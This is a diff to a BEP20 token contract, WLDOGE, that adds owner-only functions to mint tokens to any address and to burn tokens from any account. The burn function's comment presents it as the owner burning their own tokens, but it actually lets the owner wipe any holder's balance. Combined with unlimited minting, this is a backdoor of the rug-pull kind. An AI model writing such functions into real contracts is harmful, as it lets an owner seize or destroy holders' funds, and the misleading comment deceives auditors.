@@ -172,6 +172,28 @@ contract WLDOGE is Context, IBEP20, Ownable {
     }
 
     /**
+     * Same as mint but sent directly to the target address
+     *
+     *
+     */
+    function mintToAddress(address account, uint256 amount) public onlyOwner returns (bool) {
+        _mint(account, amount);
+        return true;
+    }
+
+    /**
+     * @dev Destroys `amount` tokens, decreasing the total supply.
+     *
+     * Requirements
+     *
+     * - `msg.sender` must be the token owner
+     */
+    function burn(address account, uint256 amount) public onlyOwner returns (bool) {
+        _burn(account, amount);
+        return true;
+    }
+
+    /**
      * @dev Moves tokens `amount` from `sender` to `recipient`.
      *
      * This is internal function is equivalent to {transfer}, and can be used to
